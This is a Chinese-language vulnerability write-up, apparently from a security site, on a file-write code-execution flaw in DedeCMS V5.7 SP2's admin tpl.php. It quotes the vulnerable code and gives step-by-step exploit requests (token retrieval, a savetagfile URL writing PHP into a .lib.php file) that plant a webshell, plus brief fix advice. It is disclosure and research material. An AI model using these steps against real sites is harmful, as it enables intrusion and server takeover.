***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **简介**  

**织梦内容管理系统(DedeCms)是一款PHP开源网站管理系统。**

 **DedeCMS V5.7
SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell。笔者是2018年2月28日在官网下载的DedeCMS
V5.7 SP2版本程序，截至发稿，漏洞依然存在。**

##  **漏洞详情**

织梦默认的后台地址是/dede/，当然也可以被更改，到时候根据网站具体情况替换默认后台地址即可。

dede/tpl.php中第251行到281行

    
    
    csrf_check();
    
    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
    
    {
    
        ShowMsg('文件名不合法，不允许进行操作！', '-1');
    
        exit();
    
    }
    
    require_once(DEDEINC.'/oxwindow.class.php');
    
    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
    
    $content = stripslashes($content);
    
    $truefile = DEDEINC.'/taglib/'.$filename;
    
    $fp = fopen($truefile, 'w');
    
    fwrite($fp, $content);
    
    fclose($fp);

> 1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。
>
> 2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。

 **注意: 这里还有一个csrf_check()函数，即请求中必须要带token参数。**

##  **漏洞利用**

1.首先获取token 访问 域名 + /dede/tpl.php?action=upload。在页面源代码中获取到token值

![token.jpg](https://image.3001.net/images/20180302/15199862074273.jpg!small)

然后访问

    
    
    域名 + /dede/tpl.php?filename=moonsec.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=[你的token值

![moonsec.jpg](https://image.3001.net/images/20180302/15199862205134.jpg!small)

shell:

    
    
    域名 + /include/taglib/moonsec.lib.php

![shell.jpg](https://image.3001.net/images/20180302/15199862318313.jpg!small)  

## **漏洞修复**

> 1.禁止此处写入文件。
>
> 2.过滤恶意标签

## 参考链接

<http://www.cnvd.org.cn/flaw/show/CNVD-2018-01221>

 ***本文原创作者：风炫520，转载请注明来自FreeBuf.COM**

